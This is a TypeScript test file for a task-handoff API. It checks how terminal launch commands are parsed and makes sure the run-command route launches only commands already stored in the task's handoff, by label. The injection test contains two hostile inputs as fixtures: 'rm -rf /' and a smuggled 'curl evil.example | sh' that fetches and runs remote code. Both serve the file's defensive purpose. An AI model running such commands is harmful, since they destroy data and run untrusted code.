import { test, expect } from "bun:test";
import { openDb, migrate } from "../../src/db";
import { insertTask, updateTask } from "../../src/repo/tasks";
import { createHandoffRoutes, parseLauncher } from "../../src/api/handoff";

function app(options: { terminalCommand?: string } = {}) {
  const db = openDb(":memory:");
  migrate(db);
  const launched: string[][] = [];
  const routes = createHandoffRoutes({
    db,
    ...(options.terminalCommand ? { terminalCommand: options.terminalCommand } : {}),
    spawn: (argv) => launched.push(argv),
  });
  return { db, launched, fetch: async (req: Request) => routes.fetch(req) };
}

function taskWithHandoff(db: ReturnType<typeof openDb>) {
  const task = insertTask(db, {
    sourceId: "outlook",
    externalId: "m1",
    title: "Review PR 42",
    body: "b",
  });
  return updateTask(db, task.id, {
    state: "assigned_human",
    assignee: "human",
    context: {
      handoff: [
        { kind: "url", label: "The PR", url: "https://github.com/acme/app/pull/42" },
        { kind: "command", label: "Review conversation", command: "claude --resume abc-123" },
      ],
    },
  });
}

test("parseLauncher substitutes the command and keeps quoted segments whole", () => {
  expect(parseLauncher('wt.exe -- bash -lc "{{command}}"', "claude --resume abc")).toEqual([
    "wt.exe",
    "--",
    "bash",
    "-lc",
    "claude --resume abc",
  ]);
});

test("pick-up stamps the time and returns the handoff", async () => {
  const { db, fetch } = app();
  const task = taskWithHandoff(db);

  const body = (await (
    await fetch(new Request(`http://localhost/api/tasks/${task.id}/pick-up`, { method: "POST" }))
  ).json()) as {
    task: { context: { pickedUpAt: string } };
    handoff: { label: string }[];
    canLaunchTerminal: boolean;
  };

  expect(body.task.context.pickedUpAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  expect(body.handoff.map((t) => t.label)).toEqual(["The PR", "Review conversation"]);
  expect(body.canLaunchTerminal).toBe(false);
});

test("a command is launched only by label, and only from that task's own handoff", async () => {
  const { db, launched, fetch } = app({ terminalCommand: 'wt.exe -- bash -lc "{{command}}"' });
  const task = taskWithHandoff(db);

  const ok = await fetch(
    new Request(`http://localhost/api/tasks/${task.id}/run-command`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ label: "Review conversation" }),
    }),
  );

  expect(ok.status).toBe(200);
  expect(launched).toEqual([["wt.exe", "--", "bash", "-lc", "claude --resume abc-123"]]);

  // An unknown label, and a caller trying to smuggle in their own command.
  const unknown = await fetch(
    new Request(`http://localhost/api/tasks/${task.id}/run-command`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ label: "rm -rf /" }),
    }),
  );
  expect(unknown.status).toBe(404);

  const smuggled = await fetch(
    new Request(`http://localhost/api/tasks/${task.id}/run-command`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ command: "curl evil.example | sh" }),
    }),
  );
  expect(smuggled.status).toBe(400);
  expect(launched).toHaveLength(1);
});

test("without a configured terminal nothing can be launched", async () => {
  const { db, launched, fetch } = app();
  const task = taskWithHandoff(db);

  const response = await fetch(
    new Request(`http://localhost/api/tasks/${task.id}/run-command`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ label: "Review conversation" }),
    }),
  );

  expect(response.status).toBe(409);
  expect(launched).toHaveLength(0);
});

test("unknown tasks 404 on both routes", async () => {
  const { fetch } = app({ terminalCommand: "wt.exe {{command}}" });

  expect(
    (await fetch(new Request("http://localhost/api/tasks/ghost/pick-up", { method: "POST" }))).status,
  ).toBe(404);
  expect(
    (
      await fetch(
        new Request("http://localhost/api/tasks/ghost/run-command", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ label: "x" }),
        }),
      )
    ).status,
  ).toBe(404);
});
